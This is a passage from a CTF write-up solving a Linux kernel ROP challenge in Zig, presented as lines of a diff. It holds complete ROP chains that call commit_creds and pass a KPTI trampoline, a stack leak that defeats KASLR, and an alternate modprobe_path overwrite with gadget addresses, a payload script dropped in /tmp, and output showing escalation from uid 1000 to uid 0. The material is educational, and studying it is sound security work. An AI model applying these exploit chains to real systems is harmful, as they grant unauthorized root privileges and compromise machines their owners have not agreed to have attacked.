+    runROPChain(@as(std.posix.fd_t, @intCast(fd)), canary, creds) catch unreachable;
+    unreachable;
+}
+fn ropchain2(writer: anytype, creds_addr: u64) !void {
+    try writer.writeAll(std.mem.asBytes(&[_]u64{
+        POP_RAX,
+        KSYMTAB_COMMIT_CREDS-0x10,
+        MOV_EAX_ADDROF_RAX_PLUS_16_POP_RBP,
+        0, // junk
+        POP_RDI,
+        KSYMTAB_COMMIT_CREDS,
+        ADD_EAX_EDI,
+        POP_RDI,
+        (KSYMTAB_COMMIT_CREDS >> 32) << 32,
+        ADD_RAX_RDI,
+        POP_RDI,
+        creds_addr,
+        PUSH_RAX,
+
+        KPTI_TRAMPOLINE,
+        0, // junk
+        0, // junk
+        @intFromPtr(&ret2win),
+        user_cs,
+        user_rflags,
+        user_rsp,
+        user_ss,
+    }));
+}
+
+const ROPChain = union(enum) {
+    canary: u64,
+    creds_addr: u64,
+};
+
+fn runROPChain(fd: std.posix.fd_t, canary: u64, creds_addr: ?u64) !void {
+    const file = (std.fs.File{ .handle = fd }).writer();
+    var bw = std.io.bufferedWriter(file);
+    const writer = bw.writer();
+
+    try writer.writeByteNTimes(0, tmp_size);
+    try writer.writeAll(std.mem.asBytes(&canary));
+    try writer.writeByteNTimes(0, (8*3));
+    if (creds_addr) |caddr| {
+        ropchain2(writer, caddr);
+    } else {
+        ropchain1(writer, fd, canary);
+    }
+    try bw.flush();
+
+    unreachable;
+}
+
+
+fn adjust_offsets(kaslr_offset: u64) void {
+    const gadgets = &[_]*u64{
+        &POP_RDI,
+        &POP_RAX,
+        &POP_RBX,
+        &POP_RDX,
+        &PUSH_RAX,
+        &MOV_EAX_ADDROF_RAX_PLUS_16_POP_RBP,
+        &ADD_RAX_RDI,
+        &ADD_EAX_EDI,
+
+        &KPTI_TRAMPOLINE,
+        &KSYMTAB_PREPARE_KERNEL_CRED,
+        &KSYMTAB_COMMIT_CREDS,
+    };
+    for (gadgets) |g| {
+        g.* += kaslr_offset;
+    }
+}
+```
+
+Now we just need a leak to defeat regular KASLR.
+
+Zig
+
+``` zig
+fn dumpStack(fd: std.posix.fd_t) !void {
+    var buf: [350]u8 = undefined;
+    const bytes_read = try std.posix.read(fd, &buf);
+
+    std.debug.dumpHex(buf[0..bytes_read]);
+}
+```
+
+Let’s compare the output of dumpStack before and after a reboot to see what remains the same:
+
+Diff
+
+``` diff
+1,22c1,22
+< 00007ffccba8e082  20 10 60 87 D3 8C FF FF  E0 0F 00 00 00 00 00 00   .`.............
+< 00007ffccba8e092  00 7D 35 B9 68 99 63 84  10 D6 CA 86 D3 8C FF FF  .}5.h.c.........
+< 00007ffccba8e0a2  68 FE 1B 80 1A B9 FF FF  04 00 00 00 00 00 00 00  h...............
+< 00007ffccba8e0b2  00 D6 CA 86 D3 8C FF FF  F0 FE 1B 80 1A B9 FF FF  ................
+< 00007ffccba8e0c2  00 D6 CA 86 D3 8C FF FF  80 FE 1B 80 1A B9 FF FF  ................
+< 00007ffccba8e0d2  D7 7B E8 A3 FF FF FF FF  D7 7B E8 A3 FF FF FF FF  .{.......{......
+< 00007ffccba8e0e2  00 D6 CA 86 D3 8C FF FF  00 00 00 00 00 00 00 00  ................
+< 00007ffccba8e0f2  82 E0 A8 CB FC 7F 00 00  A0 FE 1B 80 1A B9 FF FF  ................
+< 00007ffccba8e102  00 7D 35 B9 68 99 63 84  5E 01 00 00 00 00 00 00  .}5.h.c.^.......
+< 00007ffccba8e112  00 00 00 00 00 00 00 00  D8 FE 1B 80 1A B9 FF FF  ................
+< 00007ffccba8e122  2F 28 09 A4 FF FF FF FF  00 D6 CA 86 D3 8C FF FF  /(␉.............
+< 00007ffccba8e132  00 D6 CA 86 D3 8C FF FF  82 E0 A8 CB FC 7F 00 00  ................
+< 00007ffccba8e142  5E 01 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ^...............
+< 00007ffccba8e152  20 FF 1B 80 1A B9 FF FF  A7 22 1A A4 FF FF FF FF   ........"......
+< 00007ffccba8e162  F1 11 23 A4 FF FF FF FF  00 00 00 00 00 00 00 00  ..#.............
+< 00007ffccba8e172  00 7D 35 B9 68 99 63 84  58 FF 1B 80 1A B9 FF FF  .}5.h.c.X.......
+< 00007ffccba8e182  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+< 00007ffccba8e192  00 00 00 00 00 00 00 00  30 FF 1B 80 1A B9 FF FF  ........0.......
+< 00007ffccba8e1a2  DA 19 2E A4 FF FF FF FF  48 FF 1B 80 1A B9 FF FF  ........H.......
+< 00007ffccba8e1b2  57 A1 A0 A3 FF FF FF FF  00 00 00 00 00 00 00 00  W...............
+< 00007ffccba8e1c2  00 00 00 00 00 00 00 00  8C 00 C0 A3 FF FF FF FF  ................
+< 00007ffccba8e1d2  00 00 00 00 00 00 00 00  00 00 00 00 00 00        ..............
+---
+> 00007ffcef2175d2  20 20 60 47 F0 90 FF FF  E0 0F 00 00 00 00 00 00    `G............
+> 00007ffcef2175e2  00 0E 76 FC EA 35 42 B0  10 DC CA 46 F0 90 FF FF  ..v..5B....F....
+> 00007ffcef2175f2  68 7E 1C C0 28 A9 FF FF  04 00 00 00 00 00 00 00  h~..(...........
+> 00007ffcef217602  00 DC CA 46 F0 90 FF FF  F0 7E 1C C0 28 A9 FF FF  ...F.....~..(...
+> 00007ffcef217612  00 DC CA 46 F0 90 FF FF  80 7E 1C C0 28 A9 FF FF  ...F.....~..(...
+> 00007ffcef217622  97 45 2E B3 FF FF FF FF  97 45 2E B3 FF FF FF FF  .E.......E......
+> 00007ffcef217632  00 DC CA 46 F0 90 FF FF  00 00 00 00 00 00 00 00  ...F............
+> 00007ffcef217642  D2 75 21 EF FC 7F 00 00  A0 7E 1C C0 28 A9 FF FF  .u!......~..(...
+> 00007ffcef217652  00 0E 76 FC EA 35 42 B0  5E 01 00 00 00 00 00 00  ..v..5B.^.......
+> 00007ffcef217662  00 00 00 00 00 00 00 00  D8 7E 1C C0 28 A9 FF FF  .........~..(...
+> 00007ffcef217672  AF E5 28 B3 FF FF FF FF  00 DC CA 46 F0 90 FF FF  ..(........F....
+> 00007ffcef217682  00 DC CA 46 F0 90 FF FF  D2 75 21 EF FC 7F 00 00  ...F.....u!.....
+> 00007ffcef217692  5E 01 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ^...............
+> 00007ffcef2176a2  20 7F 1C C0 28 A9 FF FF  C7 2E 70 B3 FF FF FF FF   ...(.....p.....
+> 00007ffcef2176b2  B1 59 70 B3 FF FF FF FF  00 00 00 00 00 00 00 00  .Yp.............
+> 00007ffcef2176c2  00 0E 76 FC EA 35 42 B0  58 7F 1C C0 28 A9 FF FF  ..v..5B.X...(...
+> 00007ffcef2176d2  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+> 00007ffcef2176e2  00 00 00 00 00 00 00 00  30 7F 1C C0 28 A9 FF FF  ........0...(...
+> 00007ffcef2176f2  3A 14 4C B3 FF FF FF FF  48 7F 1C C0 28 A9 FF FF  :.L.....H...(...
+> 00007ffcef217702  57 A1 C0 B2 FF FF FF FF  00 00 00 00 00 00 00 00  W...............
+> 00007ffcef217712  00 00 00 00 00 00 00 00  8C 00 E0 B2 FF FF FF FF  ................
+> 00007ffcef217722  00 00 00 00 00 00 00 00  00 00 00 00 00 00        ..............
+```
+
+Notice the values buf\[304..304+8\] and buf\[328..328+8\]: across the different runs only the 4th least significant byte differs. Furthermore, this byte is the same for both values in a single run, so it’s very likely that these values are a constant offset from the kernel base. As it turns out, masking out the lower 2 bytes of buf\[304..304+8\] yields the kernel base address (source: trust me bro)!
+
+Zig
+
+``` zig
+fn leakBaseAddress(fd: std.posix.fd_t) !u64 {
+    var buf: [304+8]u8 = undefined;
+    _ = try std.posix.read(fd, &buf);
+    const ret = std.mem.bytesAsValue(u64, buf[304..]).*;
+    return (ret >> 16) << 16;
+}
+```
+
+We just need to call adjust_offsets with our kernel base address leak, and bob’s our uncle.
+
+``` text
+whoami: unknown uid 1000
+[INFO] Saved state
+[INFO] Canary: 0x6071ec017b6ac500
+[INFO] Kernel base: 0xffffffffa4200000
+[INFO] You won!!
+whoami: unknown uid 0
+```
+
+#### Alternate solve: modprobe_path
+
+This is not an alternative bypass to KASLR, but rather a different attack vector to indirectly achieve priviledge escalation without putzing with commit_creds(prepare_kernel_cred(0)).
+
+Basically, when execve‘ing a binary with magic bytes the kernel doesn’t recognize, eventually the following will get called:
+
+Bash
+
+``` bash
+$modprobe_path -q -- binfmt-$MAGIC
+```
+
+Where `$modprobe_path` is the string stored in the `modprobe_path` kernel symbol, and `$MAGIC` is whatever the magic bytes of the file are. So if we overwrite `modprobe_path`, we can get the kernel to execute a file we control.
+
+Bash
+
+``` bash
+cat /proc/kallsyms | grep -e 'modprobe_path'
+```
+
+``` text
+ffffffff82061820 D modprobe_path
+```
+
+Bash
+
+``` bash
+ropr --range=0xffffffff81000000-0xffffffff81400dc6 -R '^(pop rdi;|pop rax;|mov \[rdi+.{3,5}\], ...;) ret;' vmlinux
+```
+
+``` text
+0xffffffff81004d11: pop rax; ret;
+0xffffffff8100767c: pop rdi; ret;
+0xffffffff81012833: mov [rdi+0x10], r8d; ret;
+0xffffffff81012834: mov [rdi+0x10], eax; ret;
+```
+
+Zig
+
+``` zig
+var POP_RDI: u64 = 0xffffffff8100767c;
+var POP_RAX: u64 = 0xffffffff81004d11;
+var MOV_ADDROF_RDI_PLUS_16_EAX: u64 = 0xffffffff81012834;
+
+var MODPROBE_PATH: u64 = 0xffffffff82061820;
+var KPTI_TRAMPOLINE: u64 = 0xffffffff81200f26;
+
+fn ropchain(writer: anytype) !void {
+    try writer.writeAll(std.mem.asBytes(&[_]u64{
+        POP_RAX,
+        std.mem.readInt(u32, "/tmp", .little),
+        POP_RDI,
+        MODPROBE_PATH-0x10,
+        MOV_ADDROF_RDI_PLUS_16_EAX,
+        POP_RAX,
+        std.mem.readInt(u32, "/a" ++ &[_]u8{0} ** 2, .little),
+        POP_RDI,
+        MODPROBE_PATH-0x10+0x4,
+        MOV_ADDROF_RDI_PLUS_16_EAX,
+
+        KPTI_TRAMPOLINE,
+        0, // junk
+        0, // junk
+        @intFromPtr(&ret2win),
+        user_cs,
+        user_rflags,
+        user_rsp,
+        user_ss,
+    }));
+}
+
+fn ret2win() !void {
+    std.debug.print("[INFO] You won!!\n", .{});
+
+    const tmpa = try std.fs.cwd().createFile(
+        "/tmp/a", .{
+            .read = true,
+            .mode = 0o777,
+        },
+    );
+    try tmpa.writeAll(
+        \\#!/bin/sh
+        \\whoami &> /tmp/its-a-me
+        \\chmod 777 /tmp/its-a-me
+    );
+    tmpa.close();
+
+    const unknown = try std.fs.cwd().createFile(
+        "/tmp/unknown", .{
+            .read = true,
+            .mode = 0o777,
+        },
+    );
+    try unknown.writeAll(&[_]u8{0xff}**4);
+    unknown.close();
+}
+```
+
+Bash
+
+``` bash
+whoami
+./exploit
+# execute bogus file
+/tmp/unknown &> /dev/null
+cat /tmp/its-a-me
+```
+
+``` text
+whoami: unknown uid 1000
+[INFO] Saved state
+[INFO] Canary: 0x0743fe8b3c798800
+[INFO] Kernel base: 0xffffffff85800000
+[INFO] You won!!
+whoami: unknown uid 0
+```
+
+## Resources
+
+This was my first time solving a kernel pwn challenge, and I was initially quite lost as how to even approach this challenge. I found the following resources invaluable:
+
+[PAWNYABLE Holstein v1](https://pawnyable.cafe/linux-kernel/LK01/stack_overflow.html)  
+Really good resource for learning the basics of kernel pwn and setting up your environment for kernel debugging.
+
+Other kernel-rop writeups  
+The writeups published by [Midas](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/) and [0x434b](https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/) were super helpful for learning bypasses to different mitigations and alternative solutions to arrive at privileged code execution.
+
+For those curious, I wrote [the exploits and this post](https://feyor.sh/kernel-rop/SOLVE.org) using Emacs org-mode. Taking the time to get it setup was a little annoying, but being able to run arbitrary commands in the challenge VM (not to mention compiling an exploit and regenerating the initramfs) with a single keystroke hugely improved my productivity.
+
+Using Zig instead of C was also quite nice because of a (imo) much better standard library and quick compile times. Even if using C, using zig cc to easily target `x86_64-linux-musl` is super convenient.
+
+*If you want to program at the edge of your abilities, consider applying to the [Recurse Center](https://www.recurse.com/scout/click?t=c9ef0a055fcd2cd243ac045bc1f6dd82).*
+
+------------------------------------------------------------------------
+
+1.  <https://ir0nstone.gitbook.io/notes/binexp/kernel/the-ultimate-aim-of-kernel-exploitation-process-credentials> [↩︎](#fnref:1)
+
+2.  <https://tldp.org/HOWTO/Module-HOWTO/x627.html> [↩︎](#fnref:2)
+
+3.  <https://elixir.bootlin.com/linux/v5.9-rc6/source/include/linux/export.h#L60-L64> [↩︎](#fnref:3)
+
+[\#pwn](https://feyor.sh/tags/pwn/)  
